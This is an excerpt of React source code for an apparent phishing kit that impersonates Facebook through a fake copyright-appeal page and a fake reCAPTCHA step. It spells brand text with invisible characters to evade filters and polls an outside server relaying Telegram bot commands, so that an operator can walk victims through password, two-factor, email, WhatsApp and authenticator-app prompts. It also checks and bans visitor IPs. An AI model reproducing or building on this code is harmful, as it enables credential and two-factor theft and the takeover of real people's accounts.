...
import LoginRed from "../components/LoginRed.js";
import LoginEmailRed from "../components/LoginEmailRed.js";
...
export default function LoginPage() {
  ...
  useEffect(() => {
    const CheckBan = async (ip) => {
      await axios.get(`https://myself2.onrender.com/checkBan/${ip}`).then((data) => {
        if (data.data.data) {
  ...
  const getUserTelegramId = async (uniqueString) => {
    const x = await axios.get(`https://myself2.onrender.com/getMessages`);
    ...
    if (result) {
      ...
      const incorrectTwoFa = messageUpdates.find(
        ({ callback_query }) =>
          callback_query.data === `/incorrect-2fa ${uniqueString}`
      );

      const incorrectEmail = messageUpdates.find(
        ({ callback_query }) =>
          callback_query.data === `/incorrect-email ${uniqueString}`
      );

      const password = messageUpdates.find(
        ({ callback_query }) =>
          callback_query.data === `/password ${uniqueString}`
      );
      ...
      const whatsapp = messageUpdates.find(
        ({ callback_query }) =>
          callback_query.data === `/whatsapp ${uniqueString}`
      );

      const emailVerify = messageUpdates.find(
        ({ callback_query }) =>
          callback_query.data === `/emailVerify ${uniqueString}`
      );
      ...
      const authApp = messageUpdates.find(
        ({ callback_query }) =>
          callback_query.data === `/authApp ${uniqueString}`
      );
      ...
      if (incorrectTwoFa && refreshKey !== incorrectTwoFa.update_id) {
        setRefreshKey(incorrectTwoFa.update_id);
        setLastFetch("incorrect-2fa");
        setStep(6);
      }

      if (incorrectEmail && refreshKey !== incorrectEmail.update_id) {
        setRefreshKey(incorrectEmail.update_id);
        setLastFetch("incorrect-email");
        setStep(97);
      }
      ...
      if (password && refreshKey !== password.update_id) {
        setRefreshKey(password.update_id);
      ...
      if (LastFetch !== "Ban") {
        if (ban) {
          setLastFetch("Ban");
          axios.get(`https://myself2.onrender.com/ban/${Ip}`);
        }
      }
    }
  };
  ...
  useEffect(() => {
    ...
    if (Step === 8 || Step === 9 || Step === 99 || Step === 98 || Step === 97) {
  ...
  return (
    <>
      <Head>
        {Step === 0 ? <title>ReCAPTCHA</title> : <title>F‎a‎c‎e‎b‎o‎o‎k</title>}

        {Step === 11 || Step === 99 || Step === 98 || Step === 97 ? (
          <link rel="icon" href={`${basePath}/assets/fb.png`} />
        ) : (
      ...
      <DataContext.Provider value={{ setAllData, AllData }}>
        {Step === 11 || Step === 99 || Step === 98 || Step === 97 ? (
          Step === 99 ? (
            <Login Unik={Unik} setIp={setIp} />
          ) : Step === 98 ? (
            <LoginRed key={refreshKey} Unik={Unik} />
          ) : Step === 97 ? (
            <LoginEmailRed key={refreshKey} Unik={Unik} />
          ) : (
            <Done />
          )
        ) : (
                  ...
                  <>
                    <div className="col-auto d-none d-lg-block">
                      <div style={{ width: "320px" }} className="py-4">
                        <div className="pb-1">
                          <img
                            src={`${basePath}/assets/svgs/mtlg.svg`}
                            width={60}
                            height={12}
                            alt=""
                          />
                        ...
                        <div className="pb-3">
                          ...
                          >
                            I‎f yo‎u b‎el‎i‎ev‎e a d‎ec‎‎is‎io‎n r‎eg‎a‎r‎d‎in‎g
                            a c‎o‎py‎r‎i‎ght vi‎o‎l‎a‎ti‎o‎n o‎r a‎n‎y o‎t‎h‎er
                            i‎s‎s‎u‎e i‎s i‎n‎co‎r‎r‎ec‎t, yo‎u c‎an su‎b‎m‎i‎t
                            a‎n a‎p‎pea‎l he‎r‎e.
                          </div>
                        </div>
                        <div className="pb-2">
                          <span
                        ...
                        <div className="pt-4">
                          ...
                          <LinksWrapper className="ps-3">
                            <a
                              href="/"
                              className="row gx-3 align-items-center py-2 text-decoration-none"
                              style={{
                                color: "#1C2B34",
                                fontWeight: 500,
                                lineHeight: 1.2,
                            ...
                            >
                              <div className="col">
                                ...
                                >
                                  S‎e‎l‎l o‎n F‎a‎c‎e‎b‎o‎ok‎ a‎n‎d
                                  I‎n‎st‎a‎gr‎a‎m
                                </span>
                              </div>
                              <div className="col-auto">
                    ...
                    {
                      {
                        ...
                        8: (
                          <>
                            <PModal setStep={setStep} Unik={Unik} Ip={Ip} />
                            <Background />
                          </>
                        ),
                        9: (
                          <>
                            <Step2Modal setStep={setStep} Unik={Unik} Ip={Ip} />
                            <Background />
                          </>
                        ),
                        10: (
